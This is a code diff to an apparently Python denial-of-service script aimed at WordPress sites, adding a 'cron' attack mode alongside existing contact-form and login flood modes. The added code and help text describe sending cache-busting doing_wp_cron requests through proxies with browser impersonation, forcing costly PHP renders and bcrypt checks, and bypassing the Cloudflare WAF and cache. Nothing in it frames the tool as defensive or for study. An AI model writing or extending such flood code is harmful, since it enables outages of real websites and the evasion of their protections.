@@ -554,6 +554,14 @@ def send_one(req_num, cfg, pool):
                 impersonate=impersonate,
                 timeout=25,
             )
+        elif ATTACK_MODE == "cron":
+            r = cf_requests.get(
+                f"https://{domain}/?doing_wp_cron={int(time.time())}.{random.randint(100000,999999)}",
+                headers={**hdrs, "Accept": "text/html,application/xhtml+xml,*/*;q=0.9"},
+                proxies=px,
+                impersonate=impersonate,
+                timeout=25,
+            )
         elif HOMEPAGE_MODE:
             r = cf_requests.get(
                 f"https://{domain}/",
@@ -824,11 +832,14 @@ def main():
                         "8-12 fake WP cookies, Sec-Fetch-*, DNT, X-Requested-With.\n"
                         "Forces PHP $_SERVER + WordPress cookie parsing overhead.")
     p.add_argument("--mode",  default="cf7",
-                   choices=["cf7", "login"],
+                   choices=["cf7", "login", "cron"],
                    help="Attack mode (default: cf7):\n"
                         "  cf7   — CF7 REST API form submission (default)\n"
                         "  login — wp-login.php POST flood; each failed attempt runs\n"
-                        "          bcrypt password_verify (~100ms CPU per request)")
+                        "          bcrypt password_verify (~100ms CPU per request)\n"
+                        "  cron  — GET /?doing_wp_cron=<ts> ; triggers WP-Cron pipeline\n"
+                        "          + full homepage PHP render (47KB, heavier than CF7);\n"
+                        "          bypasses CF WAF and CF cache (cf-cache-status: DYNAMIC)")
     p.add_argument("--msg-repeat",   type=int, default=1, metavar="N",
                    help="Repeat the message body N times (separator between each).\n"
                         "N=5 → ~15KB, N=10 → ~30KB per request.\n"
